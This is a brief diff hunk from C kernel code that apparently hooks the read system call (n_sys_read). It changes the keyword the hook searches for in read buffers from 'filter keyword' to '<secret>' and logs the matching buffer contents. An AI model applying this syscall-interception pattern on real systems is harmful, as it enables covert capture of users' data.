@@ -34,8 +34,8 @@ asmlinkage long n_sys_read ( unsigned int fd, char __user *buf, size_t count )
             kfree(debug);
         }
         else
-        {
-            if ( memstr(debug, "filter keyword", count) )
+        {   
+            if (memstr(debug, "<secret>", count))
             {
                 unsigned long i;
                 DEBUG_RW("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
